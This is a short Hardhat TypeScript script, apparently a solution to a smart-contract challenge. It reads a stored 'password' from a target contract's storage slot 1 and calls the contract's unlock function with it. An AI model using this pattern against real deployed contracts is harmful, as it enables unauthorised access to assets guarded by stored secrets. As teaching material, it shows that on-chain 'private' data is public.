import { ethers, waffle } from 'hardhat';

const helper = async (victim: any) => {
    const provider = ethers.provider;
    const password = await provider.getStorageAt(victim.address, 1);

    await victim.unlock(password);
};

export default helper;
